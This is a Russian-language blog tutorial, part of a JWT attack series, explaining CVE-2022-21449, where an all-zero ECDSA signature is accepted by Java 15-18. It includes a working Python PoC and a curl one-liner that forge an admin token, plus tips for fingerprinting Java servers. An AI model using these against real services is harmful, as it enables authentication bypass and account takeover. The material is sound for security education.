---
title: "JWT, часть 8: Psychic Signatures - нулевая подпись на Java"
date: 2026-03-21T18:07:00+03:00
number: 8
tags: ["jwt", "security", "web", "auth"]
summary: "Подпись из одних нулей проходит ECDSA-верификацию на Java 15-18. Для любого сообщения, с любым ключом. Пять строк Python - и ты admin."
---

**Содержание:**
- [ECDSA в одном абзаце](#ecdsa-в-одном-абзаце)
- [Что произошло: CVE-2022-21449](#что-произошло-cve-2022-21449)
- [Почему r=0, s=0 ломает математику](#почему-r0-s0-ломает-математику)
- [PoC: подделка JWT за 5 строк](#poc-подделка-jwt-за-5-строк)
- [Bash one-liner для тестирования](#bash-one-liner-для-тестирования)
- [Что затронуто](#что-затронуто)
- [Как определить Java на сервере](#как-определить-java-на-сервере)
- [Уязвимые версии](#уязвимые-версии)
- [Что дальше](#что-дальше)

Мы ломали HMAC брутфорсом (статья 7), RSA через algorithm confusion (статья 4). Теперь ECDSA.

Апрель 2022 года. Neil Madden из ForgeRock обнаруживает, что подпись из одних нулей проходит ECDSA-верификацию на Java 15-18. Для **любого** сообщения. С **любым** ключом. Хочешь быть admin? Подписывай нулями. TLS? Нулями. SAML? Нулями.

## ECDSA в одном абзаце

ECDSA (Elliptic Curve Digital Signature Algorithm) - алгоритм цифровой подписи на эллиптических кривых. В JWT он используется под именами ES256, ES384, ES512. Подпись ECDSA - это пара чисел `(r, s)`. При подписании используется случайный одноразовый номер `k` (nonce - number used once): из `k` вычисляется `r` (координата точки на кривой), а `s` вычисляется через формулу, связывающую `k`, хеш сообщения, `r` и приватный ключ. При верификации из `r`, `s`, хеша сообщения и публичного ключа вычисляется точка на кривой, и ее x-координата сравнивается с `r`. Если совпала - подпись валидна.

Ключевое: и `r`, и `s` должны быть числами **от 1 и выше**. Ноль недопустим. Именно эту проверку забыли в Java.

## Что произошло: CVE-2022-21449

В Java 15 реализацию ECDSA переписали с нативного C-кода (который работал корректно и включал все необходимые проверки) на чистую Java. При переписывании потеряли проверку `r >= 1 && s >= 1`. Такая строчка была в C-коде, но не попала в Java-версию.

## Почему r=0, s=0 ломает математику

Представь аналогию: у тебя есть уравнение проверки, в которое подставляются `r` и `s`. Когда оба равны нулю, все промежуточные вычисления коллапсируют. В ECDSA верификация включает деление на `s` (вычисление обратного элемента `s` по модулю порядка группы). Когда `s = 0`, обратный элемент не существует - но Java-реализация не проверяла этот случай и продолжала вычисления с нулями.

Технически: вычисляются точки `u1*G + u2*Q`, где `u1` и `u2` зависят от `s^(-1)`. При `s = 0` операция `s^(-1)` должна вызвать ошибку, но вместо этого дает 0. Тогда `u1 = 0` и `u2 = 0`, точка вычисляется как `0*G + 0*Q = O` (точка бесконечности), а ее x-координата определяется как 0. Проверка: `0 == r`, где `r = 0`. True. Подпись принята.

Если провести аналогию - это как замок, в котором код `0000` принимается как правильный, потому что механизм проверки перемножает цифры кода: `0 * 0 * 0 * 0 = 0`, и сравнивает с секретным значением, которое тоже вычислилось в 0 из-за той же ошибки.

<div class="ecdsa-viz" style="margin: 2rem 0;">
<div style="background: var(--bg-card); border-radius: var(--radius); border: 1px solid var(--border); padding: 20px 16px 16px; position: relative; overflow: hidden;">
  <div style="display: flex; gap: 8px; margin-bottom: 16px; flex-wrap: wrap;">
    <button onclick="ecdsaSetMode('normal')" id="ecdsa-btn-normal" style="font-family: var(--font-mono); font-size: 12px; padding: 6px 14px; border-radius: 4px; border: 1px solid var(--pink); background: rgba(254,205,200,0.08); color: var(--pink); cursor: pointer;">Нормальная верификация</button>
    <button onclick="ecdsaSetMode('attack')" id="ecdsa-btn-attack" style="font-family: var(--font-mono); font-size: 12px; padding: 6px 14px; border-radius: 4px; border: 1px solid var(--border); background: transparent; color: var(--text-dim); cursor: pointer;">Атака: r=0, s=0</button>
    <button onclick="ecdsaSetMode('compare')" id="ecdsa-btn-compare" style="font-family: var(--font-mono); font-size: 12px; padding: 6px 14px; border-radius: 4px; border: 1px solid var(--border); background: transparent; color: var(--text-dim); cursor: pointer;">Сравнение</button>
  </div>
  <svg id="ecdsa-graph" width="100%" viewBox="0 0 640 420"></svg>
  <div style="display: flex; gap: 16px; margin-top: 12px; font-size: 11px; color: var(--text-dim); flex-wrap: wrap; font-family: var(--font-mono);">
    <span><span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--pink);vertical-align:middle;margin-right:4px;"></span>Эллиптическая кривая</span>
    <span><span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:#e8a838;vertical-align:middle;margin-right:4px;"></span>Точки подписи (r, s)</span>
    <span><span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:#ff6b6b;vertical-align:middle;margin-right:4px;"></span>Нулевая подпись</span>
    <span><span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:#68d391;vertical-align:middle;margin-right:4px;"></span>Результат верификации</span>
  </div>
</div>
<div id="ecdsa-info" style="margin-top: 12px; padding: 14px 16px; background: var(--bg-card); border-radius: var(--radius); border: 1px solid var(--border); font-size: 12px; line-height: 1.7; color: var(--text-dim); font-family: var(--font-mono);"></div>
</div>

<script>
(function(){
const svg = document.getElementById('ecdsa-graph');
const info = document.getElementById('ecdsa-info');
let mode = 'normal';
let t = 0;
const cx = 320, cy = 210, scale = 48;
const C = {
  pink: '#fecdc8', pinkMid: '#d4a8a3', warm: '#e8a838',
  red: '#ff6b6b', green: '#68d391', link: '#6ab7e2',
  text: '#dce1e8', dim: '#8696a7', border: '#2b3d4f',
  card: '#1e2c3a', grid: '#253545'
};
function toSvg(x, y) { return [cx + x * scale, cy - y * scale]; }
function curvePoints() {
  const pts = [], pts2 = [];
  for (let px = -2.5; px <= 3.2; px += 0.01) {
    const yy = px*px*px - 3*px + 3;
    if (yy >= 0) pts.push({x: px, y: Math.sqrt(yy)});
  }
  for (let i = pts.length - 1; i >= 0; i--) pts2.push({x: pts[i].x, y: -pts[i].y});
  return {upper: pts, lower: pts2};
}
function pathFromPoints(points) {
  return points.map((p, i) => {
    const [sx, sy] = toSvg(p.x, p.y);
    return (i === 0 ? 'M' : 'L') + sx.toFixed(1) + ' ' + sy.toFixed(1);
  }).join('');
}
function drawGrid() {
  let s = '';
  for (let x = -6; x <= 6; x++) {
    const [sx] = toSvg(x, 0);
    s += '<line x1="'+sx+'" y1="20" x2="'+sx+'" y2="400" stroke="'+C.grid+'" stroke-width="0.5"/>';
  }
  for (let y = -4; y <= 4; y++) {
    const [, sy] = toSvg(0, y);
    s += '<line x1="20" y1="'+sy+'" x2="620" y2="'+sy+'" stroke="'+C.grid+'" stroke-width="0.5"/>';
  }
  s += '<line x1="20" y1="'+cy+'" x2="620" y2="'+cy+'" stroke="'+C.border+'" stroke-width="1"/>';
  s += '<line x1="'+cx+'" y1="20" x2="'+cx+'" y2="400" stroke="'+C.border+'" stroke-width="1"/>';
  return s;
}
function drawCurve() {
  const {upper, lower} = curvePoints();
  return '<path d="'+pathFromPoints(upper)+'" fill="none" stroke="'+C.pink+'" stroke-width="2" opacity="0.8"/>' +
         '<path d="'+pathFromPoints(lower)+'" fill="none" stroke="'+C.pink+'" stroke-width="2" opacity="0.8"/>';
}
function drawPoint(x, y, color, label, lp, pulse) {
  const [sx, sy] = toSvg(x, y);
  let s = '';
  if (pulse) s += '<circle cx="'+sx+'" cy="'+sy+'" r="'+(8+Math.sin(t*3)*3)+'" fill="'+color+'" opacity="0.15"/>';
  s += '<circle cx="'+sx+'" cy="'+sy+'" r="5" fill="'+color+'" stroke="'+C.card+'" stroke-width="1.5"/>';
  const tx = lp==='right'?sx+12:lp==='left'?sx-12:sx;
  const ty = lp==='above'?sy-14:lp==='below'?sy+18:sy+4;
  const a = lp==='right'?'start':lp==='left'?'end':'middle';
  s += '<text x="'+tx+'" y="'+ty+'" fill="'+color+'" font-size="11" font-family="var(--font-mono)" text-anchor="'+a+'">'+label+'</text>';
  return s;
}
function drawNormal() {
  let s = '';
  const G = {x:-1.73, y:Math.sqrt((-1.73)**3-3*(-1.73)+3)};
  const R = {x:1.5, y:Math.sqrt(1.5**3-3*1.5+3)};
  const Q = {x:0.3, y:Math.sqrt(0.3**3-3*0.3+3)};
  s += drawPoint(G.x,G.y,C.pinkMid,'G (генератор)','left',false);
  s += drawPoint(Q.x,Q.y,C.link,'Q (публ. ключ)','right',false);
  s += drawPoint(R.x,R.y,C.warm,'R = k\u00b7G','right',true);
  const [gsx,gsy]=toSvg(G.x,G.y), [rsx,rsy]=toSvg(R.x,R.y);
  s += '<path d="M'+gsx+' '+gsy+' Q'+cx+' '+(cy-60)+' '+rsx+' '+rsy+'" fill="none" stroke="'+C.warm+'" stroke-width="1" stroke-dasharray="6 4" opacity="0.6"/>';
  const [rx0]=toSvg(R.x,0);
  s += '<line x1="'+rsx+'" y1="'+rsy+'" x2="'+rsx+'" y2="'+cy+'" stroke="'+C.warm+'" stroke-width="1" stroke-dasharray="4 3" opacity="0.4"/>';
  s += '<text x="'+rx0+'" y="'+(cy+32)+'" fill="'+C.warm+'" font-size="11" font-family="var(--font-mono)" text-anchor="middle">r = x(R)</text>';
  const vx=cx+170;
  s += '<text x="'+vx+'" y="44" fill="'+C.warm+'" font-size="12" font-family="var(--font-mono)">Подпись: (r, s)</text>';
  s += '<text x="'+vx+'" y="62" fill="'+C.dim+'" font-size="11" font-family="var(--font-mono)">r \u2260 0, s \u2260 0</text>';
  s += '<text x="'+vx+'" y="90" fill="'+C.green+'" font-size="11" font-family="var(--font-mono)">Верификация:</text>';
  s += '<text x="'+vx+'" y="106" fill="'+C.dim+'" font-size="10" font-family="var(--font-mono)">u\u2081 = hash\u00b7s\u207b\u00b9</text>';
  s += '<text x="'+vx+'" y="120" fill="'+C.dim+'" font-size="10" font-family="var(--font-mono)">u\u2082 = r\u00b7s\u207b\u00b9</text>';
  s += '<text x="'+vx+'" y="134" fill="'+C.dim+'" font-size="10" font-family="var(--font-mono)">P = u\u2081\u00b7G + u\u2082\u00b7Q</text>';
  s += '<text x="'+vx+'" y="150" fill="'+C.green+'" font-size="10" font-family="var(--font-mono)">x(P) == r? \u2713</text>';
  return s;
}
function drawAttack() {
  let s = '';
  const G = {x:-1.73, y:Math.sqrt((-1.73)**3-3*(-1.73)+3)};
  const Q = {x:0.3, y:Math.sqrt(0.3**3-3*0.3+3)};
  s += drawPoint(G.x,G.y,C.pinkMid,'G','left',false);
  s += drawPoint(Q.x,Q.y,C.link,'Q','right',false);
  const p = 8+Math.sin(t*4)*4;
  const [ox,oy]=toSvg(0,0);
  s += '<circle cx="'+ox+'" cy="'+oy+'" r="'+(p+8)+'" fill="'+C.red+'" opacity="0.06"/>';
  s += '<circle cx="'+ox+'" cy="'+oy+'" r="'+p+'" fill="'+C.red+'" opacity="0.12"/>';
  s += '<circle cx="'+ox+'" cy="'+oy+'" r="7" fill="'+C.red+'" stroke="'+C.card+'" stroke-width="2"/>';
  s += '<text x="'+(ox+14)+'" y="'+(oy-10)+'" fill="'+C.red+'" font-size="12" font-family="var(--font-mono)" font-weight="700">O (0,0)</text>';
  s += '<text x="'+(ox+14)+'" y="'+(oy+6)+'" fill="'+C.red+'" font-size="10" font-family="var(--font-mono)" opacity="0.7">r=0, s=0</text>';
  const vx=cx+150;
  s += '<text x="'+vx+'" y="40" fill="'+C.red+'" font-size="12" font-family="var(--font-mono)" font-weight="700">АТАКА: (r=0, s=0)</text>';
  s += '<text x="'+vx+'" y="60" fill="'+C.dim+'" font-size="10" font-family="var(--font-mono)">s\u207b\u00b9 \u2192 не существует</text>';
  s += '<text x="'+vx+'" y="74" fill="'+C.red+'" font-size="10" font-family="var(--font-mono)">Java: s\u207b\u00b9 = 0 \u274c</text>';
  s += '<text x="'+vx+'" y="92" fill="'+C.dim+'" font-size="10" font-family="var(--font-mono)">u\u2081 = hash \u00b7 0 = 0</text>';
  s += '<text x="'+vx+'" y="106" fill="'+C.dim+'" font-size="10" font-family="var(--font-mono)">u\u2082 = 0 \u00b7 0 = 0</text>';
  s += '<text x="'+vx+'" y="124" fill="'+C.warm+'" font-size="10" font-family="var(--font-mono)">P = 0\u00b7G + 0\u00b7Q = O</text>';
  s += '<text x="'+vx+'" y="138" fill="'+C.warm+'" font-size="10" font-family="var(--font-mono)">  (точка бесконечности)</text>';
  s += '<text x="'+vx+'" y="156" fill="'+C.red+'" font-size="10" font-family="var(--font-mono)">x(O) = 0 == r = 0</text>';
  s += '<text x="'+vx+'" y="172" fill="'+C.green+'" font-size="12" font-family="var(--font-mono)" font-weight="700">\u2192 TRUE. Подпись принята!</text>';
  const [gx,gy]=toSvg(G.x,G.y), [qx,qy]=toSvg(Q.x,Q.y);
  s += '<line x1="'+gx+'" y1="'+gy+'" x2="'+ox+'" y2="'+oy+'" stroke="'+C.red+'" stroke-width="0.8" stroke-dasharray="3 4" opacity="0.3"/>';
  s += '<line x1="'+qx+'" y1="'+qy+'" x2="'+ox+'" y2="'+oy+'" stroke="'+C.red+'" stroke-width="0.8" stroke-dasharray="3 4" opacity="0.3"/>';
  return s;
}
function drawCompare() {
  let s = '';
  s += '<line x1="'+cx+'" y1="30" x2="'+cx+'" y2="400" stroke="'+C.border+'" stroke-width="1" stroke-dasharray="6 4"/>';
  s += '<text x="'+(cx/2)+'" y="36" fill="'+C.green+'" font-size="11" font-family="var(--font-mono)" text-anchor="middle">\u041d\u043e\u0440\u043c\u0430\u043b\u044c\u043d\u0430\u044f (r\u22600, s\u22600)</text>';
  s += '<text x="'+(cx+cx/2)+'" y="36" fill="'+C.red+'" font-size="11" font-family="var(--font-mono)" text-anchor="middle">\u0410\u0442\u0430\u043a\u0430 (r=0, s=0)</text>';
  const ls=28, lCx=160, lCy=220, rCx=480, rCy=220;
  function lT(x,y){return[lCx+x*ls,lCy-y*ls];}
  function rT(x,y){return[rCx+x*ls,rCy-y*ls];}
  for(let px=-2.5;px<=3.2;px+=0.02){const yy=px*px*px-3*px+3;if(yy>=0){const y=Math.sqrt(yy);const[sx1,sy1]=lT(px,y);const[sx2,sy2]=lT(px,-y);if(sx1<cx-10){s+='<circle cx="'+sx1+'" cy="'+sy1+'" r="0.7" fill="'+C.pink+'" opacity="0.5"/>';s+='<circle cx="'+sx2+'" cy="'+sy2+'" r="0.7" fill="'+C.pink+'" opacity="0.5"/>';}const[rx1,ry1]=rT(px,y);const[rx2,ry2]=rT(px,-y);if(rx1>cx+10){s+='<circle cx="'+rx1+'" cy="'+ry1+'" r="0.7" fill="'+C.pink+'" opacity="0.3"/>';s+='<circle cx="'+rx2+'" cy="'+ry2+'" r="0.7" fill="'+C.pink+'" opacity="0.3"/>';}}}
  const R={x:1.5,y:Math.sqrt(1.5**3-3*1.5+3)};const[rsx,rsy]=lT(R.x,R.y);
  s+='<circle cx="'+rsx+'" cy="'+rsy+'" r="5" fill="'+C.warm+'"/>';
  s+='<text x="'+(rsx+10)+'" y="'+(rsy+4)+'" fill="'+C.warm+'" font-size="10" font-family="var(--font-mono)">R</text>';
  const[,loy]=lT(R.x,0);
  s+='<line x1="'+rsx+'" y1="'+rsy+'" x2="'+rsx+'" y2="'+loy+'" stroke="'+C.warm+'" stroke-width="0.7" stroke-dasharray="3 3" opacity="0.5"/>';
  s+='<text x="'+rsx+'" y="'+(loy+14)+'" fill="'+C.warm+'" font-size="9" font-family="var(--font-mono)" text-anchor="middle">r \u2260 0</text>';
  s+='<text x="'+lCx+'" y="'+(lCy+100)+'" fill="'+C.green+'" font-size="11" font-family="var(--font-mono)" text-anchor="middle">u\u2081\u00b7G + u\u2082\u00b7Q = P</text>';
  s+='<text x="'+lCx+'" y="'+(lCy+116)+'" fill="'+C.green+'" font-size="10" font-family="var(--font-mono)" text-anchor="middle">x(P) == r \u2713</text>';
  s+='<text x="'+lCx+'" y="'+(lCy+134)+'" fill="'+C.dim+'" font-size="9" font-family="var(--font-mono)" text-anchor="middle">\u041c\u0430\u0442\u0435\u043c\u0430\u0442\u0438\u043a\u0430 \u0440\u0430\u0431\u043e\u0442\u0430\u0435\u0442 \u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e</text>';
  const[rox,roy]=rT(0,0);const rP=6+Math.sin(t*4)*3;
  s+='<circle cx="'+rox+'" cy="'+roy+'" r="'+(rP+6)+'" fill="'+C.red+'" opacity="0.08"/>';
  s+='<circle cx="'+rox+'" cy="'+roy+'" r="'+rP+'" fill="'+C.red+'" opacity="0.15"/>';
  s+='<circle cx="'+rox+'" cy="'+roy+'" r="6" fill="'+C.red+'"/>';
  s+='<text x="'+(rox+12)+'" y="'+(roy-6)+'" fill="'+C.red+'" font-size="10" font-family="var(--font-mono)" font-weight="700">O (0,0)</text>';
  s+='<text x="'+rCx+'" y="'+(rCy+100)+'" fill="'+C.warm+'" font-size="11" font-family="var(--font-mono)" text-anchor="middle">0\u00b7G + 0\u00b7Q = O</text>';
  s+='<text x="'+rCx+'" y="'+(rCy+116)+'" fill="'+C.red+'" font-size="10" font-family="var(--font-mono)" text-anchor="middle">x(O) = 0 == r = 0</text>';
  s+='<text x="'+rCx+'" y="'+(rCy+134)+'" fill="'+C.red+'" font-size="12" font-family="var(--font-mono)" text-anchor="middle" font-weight="700">TRUE \u2192 \u041f\u041e\u0414\u041f\u0418\u0421\u042c \u041f\u0420\u0418\u041d\u042f\u0422\u0410</text>';
  return s;
}
function ecdsaRender() {
  t += 0.016;
  let s = '';
  if (mode === 'compare') { s += drawCompare(); }
  else { s += drawGrid(); s += drawCurve(); s += '<text x="72" y="70" fill="'+C.pink+'" font-size="10" font-family="var(--font-mono)" opacity="0.5">y\u00b2 = x\u00b3 - 3x + 3</text>'; s += mode==='normal'?drawNormal():drawAttack(); }
  svg.innerHTML = s;
  requestAnimationFrame(ecdsaRender);
}
window.ecdsaSetMode = function(m) {
  mode = m;
  ['normal','attack','compare'].forEach(function(id){
    var b=document.getElementById('ecdsa-btn-'+id);
    if(id===m){b.style.borderColor=id==='attack'?C.red:C.pink;b.style.color=id==='attack'?C.red:C.pink;b.style.background=id==='attack'?'rgba(255,107,107,0.08)':'rgba(254,205,200,0.08)';}
    else{b.style.borderColor=C.border;b.style.color=C.dim;b.style.background='transparent';}
  });
  updateInfo();
};
function updateInfo() {
  if (mode==='normal') info.innerHTML='<span style="color:'+C.pink+'">$</span> <span style="color:'+C.dim+'"># \u041d\u043e\u0440\u043c\u0430\u043b\u044c\u043d\u0430\u044f \u0432\u0435\u0440\u0438\u0444\u0438\u043a\u0430\u0446\u0438\u044f ECDSA</span><br>\u041f\u043e\u0434\u043f\u0438\u0441\u044c <code style="background:rgba(255,255,255,0.05);padding:1px 5px;border-radius:3px;">(<span style="color:'+C.pink+'">r</span>, <span style="color:'+C.pink+'">s</span>)</code> - \u043f\u0430\u0440\u0430 \u0447\u0438\u0441\u0435\u043b, \u043e\u0431\u0430 <span style="color:'+C.warm+'">\u2265 1</span>.<br><span style="color:'+C.pink+'">r</span> = x-\u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u0430 \u0442\u043e\u0447\u043a\u0438 <span style="color:'+C.warm+'">R = k\u00b7G</span> \u043d\u0430 \u043a\u0440\u0438\u0432\u043e\u0439.<br>\u0412\u0435\u0440\u0438\u0444\u0438\u043a\u0430\u0442\u043e\u0440 \u0432\u044b\u0447\u0438\u0441\u043b\u044f\u0435\u0442 <code style="background:rgba(255,255,255,0.05);padding:1px 5px;border-radius:3px;">P = u\u2081\u00b7G + u\u2082\u00b7Q</code> \u0438 \u043f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u0442 <code style="background:rgba(255,255,255,0.05);padding:1px 5px;border-radius:3px;">x(P) == r</code>.<br>\u0422\u043e\u0447\u043a\u0430 P \u043b\u0435\u0436\u0438\u0442 \u043d\u0430 \u043a\u0440\u0438\u0432\u043e\u0439 \u2192 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u0430 \u0441\u043e\u0432\u043f\u0430\u0434\u0430\u0435\u0442 \u2192 <span style="color:'+C.green+'">\u043f\u043e\u0434\u043f\u0438\u0441\u044c \u0432\u0430\u043b\u0438\u0434\u043d\u0430</span>.';
  else if (mode==='attack') info.innerHTML='<span style="color:'+C.pink+'">$</span> <span style="color:'+C.dim+'"># CVE-2022-21449: Psychic Signatures</span><br>\u0410\u0442\u0430\u043a\u0443\u044e\u0449\u0438\u0439 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u044f\u0435\u0442 <code style="background:rgba(255,255,255,0.05);padding:1px 5px;border-radius:3px;">(<span style="color:'+C.red+'">r=0</span>, <span style="color:'+C.red+'">s=0</span>)</code>. Java 15-18 \u043d\u0435 \u043f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u0442 <code style="background:rgba(255,255,255,0.05);padding:1px 5px;border-radius:3px;">r \u2265 1 && s \u2265 1</code>.<br><span style="color:'+C.red+'">s\u207b\u00b9</span> \u043d\u0435 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442 (\u0434\u0435\u043b\u0435\u043d\u0438\u0435 \u043d\u0430 \u043d\u043e\u043b\u044c), \u043d\u043e Java \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u0442 <span style="color:'+C.red+'">0</span>.<br><span style="color:'+C.warm+'">u\u2081 = hash\u00b70 = 0</span>, <span style="color:'+C.warm+'">u\u2082 = 0\u00b70 = 0</span><br><span style="color:'+C.warm+'">P = 0\u00b7G + 0\u00b7Q = O</span> (\u0442\u043e\u0447\u043a\u0430 \u0431\u0435\u0441\u043a\u043e\u043d\u0435\u0447\u043d\u043e\u0441\u0442\u0438).<br><code style="background:rgba(255,255,255,0.05);padding:1px 5px;border-radius:3px;">x(O) = 0 == r = 0</code> \u2192 <span style="color:'+C.green+'">TRUE</span>. <span style="color:'+C.red+'">\u041f\u043e\u0434\u043f\u0438\u0441\u044c \u043f\u0440\u0438\u043d\u044f\u0442\u0430 \u0431\u0435\u0437 \u043f\u0440\u0438\u0432\u0430\u0442\u043d\u043e\u0433\u043e \u043a\u043b\u044e\u0447\u0430.</span>';
  else info.innerHTML='<span style="color:'+C.pink+'">$</span> <span style="color:'+C.dim+'"># \u0421\u0440\u0430\u0432\u043d\u0435\u043d\u0438\u0435: \u043d\u043e\u0440\u043c\u0430\u043b\u044c\u043d\u0430\u044f vs \u043d\u0443\u043b\u0435\u0432\u0430\u044f \u043f\u043e\u0434\u043f\u0438\u0441\u044c</span><br><span style="color:'+C.green+'">\u0421\u043b\u0435\u0432\u0430:</span> \u0442\u043e\u0447\u043a\u0430 R \u043b\u0435\u0436\u0438\u0442 \u043d\u0430 \u043a\u0440\u0438\u0432\u043e\u0439, <span style="color:'+C.pink+'">r = x(R) \u2260 0</span>. \u0412\u044b\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u044f \u0434\u0430\u044e\u0442 \u0440\u0435\u0430\u043b\u044c\u043d\u0443\u044e \u0442\u043e\u0447\u043a\u0443 P.<br><span style="color:'+C.red+'">\u0421\u043f\u0440\u0430\u0432\u0430:</span> \u0432\u0441\u0435 \u0441\u0445\u043b\u043e\u043f\u044b\u0432\u0430\u0435\u0442\u0441\u044f \u0432 \u043d\u0430\u0447\u0430\u043b\u043e \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442. <span style="color:'+C.red+'">0\u00b7G + 0\u00b7Q = O</span>.<br>\u041e\u0434\u043d\u0430 \u043f\u0440\u043e\u043f\u0443\u0449\u0435\u043d\u043d\u0430\u044f \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 <code style="background:rgba(255,255,255,0.05);padding:1px 5px;border-radius:3px;"><span style="color:'+C.warm+'">if (r < 1 || s < 1)</span></code> - \u0438 \u0432\u0441\u044f \u043c\u0430\u0442\u0435\u043c\u0430\u0442\u0438\u043a\u0430 ECDSA \u0431\u0435\u0441\u0441\u0438\u043b\u044c\u043d\u0430.';
}
updateInfo();
ecdsaRender();
})();
</script>

## PoC: подделка JWT за 5 строк

```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = b64url(json.dumps({"alg":"ES256","typ":"JWT"}).encode())
payload = b64url(json.dumps({"sub":"admin","role":"superuser","exp":1999999999}).encode())

# Подпись ES256 в P1363 формате: 64 нулевых байта (32 для r + 32 для s)
sig = b64url(b'\x00' * 64)

print(f"{header}.{payload}.{sig}")
```

Для ES384: 96 нулевых байт (48+48). Для ES512: 132 нуля (66+66). Размер зависит от кривой: P-256 использует 32-байтные числа, P-384 - 48-байтные, P-521 - 66-байтные.

В DER-формате (используется в TLS, SAML, X.509) нулевая подпись выглядит как: `MAYCAQACAQA=` - это base64 от `30 06 02 01 00 02 01 00` (ASN.1 SEQUENCE из двух INTEGER со значением 0).

## Bash one-liner для тестирования

```bash
TOKEN=$(python3 -c "
import base64,json
def b(d):return base64.urlsafe_b64encode(d).rstrip(b'=').decode()
h=b(json.dumps({'alg':'ES256','typ':'JWT'}).encode())
p=b(json.dumps({'sub':'admin'}).encode())
print(f'{h}.{p}.{b(b\"\x00\"*64)}')
")
curl -H "Authorization: Bearer $TOKEN" https://target/api/admin
```

Если ответ 200 вместо 401 - сервер работает на уязвимой Java.

## Что затронуто

CVE-2022-21449 ломает **все**, что использует ECDSA-верификацию на Java 15-18:

- **JWT** (ES256/ES384/ES512) - подделка любых токенов. Наш основной сценарий.
- **TLS 1.3 handshake** - если сервер использует ECDSA-сертификат, MITM может подделать handshake нулевой подписью. Перехват всего трафика.
- **SAML assertions** - подделка SSO-аутентификации. Вход в корпоративные системы без пароля.
- **WebAuthn/FIDO2** - обход аппаратных ключей безопасности (YubiKey и т.д.).
- **OIDC ID tokens** - подделка identity в OpenID Connect.
- **Code signing** - подпись произвольного кода.

Одна пропущенная проверка - и вся криптографическая инфраструктура Java рассыпается.

## Как определить Java на сервере

Прежде чем слать нулевую подпись, нужно убедиться, что сервер работает на Java. Признаки:

- Cookie `JSESSIONID` или заголовок `X-Powered-By: Servlet/4.0`
- Stack traces с `java.lang.`, `javax.`, Spring, Tomcat
- Endpoint `/actuator/health` (Spring Boot) - если отвечает JSON с информацией о приложении
- Заголовки `X-Application-Context`, `X-Spring-*`
- Формат ошибок: Tomcat выдает характерные HTML-страницы с версией

Определил Java 15-18? Проверяй нулевую подпись.

## Уязвимые версии

- Java SE 15 (все версии)
- Java SE 16 (все версии)
- Java SE 17 (до 17.0.3)
- Java SE 18 (до 18.0.1)

Java 11 и ниже **не затронуты** - там осталась нативная C-реализация с корректной проверкой. Java 17.0.3+ и 18.0.1+ исправлены.

Одна строчка `if (r.signum() < 1 || s.signum() < 1) return false` защищает всю криптографию. Java-разработчики потеряли ее при переписывании на 14 месяцев. За эти 14 месяцев каждый Java-сервис, использующий ECDSA, был уязвим к подделке подписи.

## Что дальше

В статьях 3-8 мы разобрали все основные атаки на JWT: `alg:none`, algorithm confusion, kid injection, jku/x5u/jwk/x5c, брутфорс, psychic signatures. Мы знаем **как** атаковать. В следующей статье давай поймем **почему** эти атаки работают - разберем криптографию JWT: HMAC, RSA, ECDSA. Зачем в HMAC два прохода, чем PS256 лучше RS256, и как Sony потеряла приватный ключ PlayStation 3 из-за повторного nonce.
